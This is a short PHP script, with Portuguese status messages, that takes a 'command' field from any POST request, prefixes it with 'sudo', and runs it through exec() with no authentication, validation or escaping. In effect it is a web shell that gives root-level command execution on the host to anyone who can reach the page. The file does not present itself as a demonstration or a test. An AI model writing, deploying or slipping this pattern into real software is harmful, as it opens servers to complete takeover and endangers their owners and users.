<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];
    $sudoCommand = "sudo $command";

    exec($sudoCommand, $output, $returnVar);

    if ($returnVar === 0) {
        echo "Comando executado com sucesso!";
    } else {
        echo "Falha ao executar o comando.";
    }
}
?>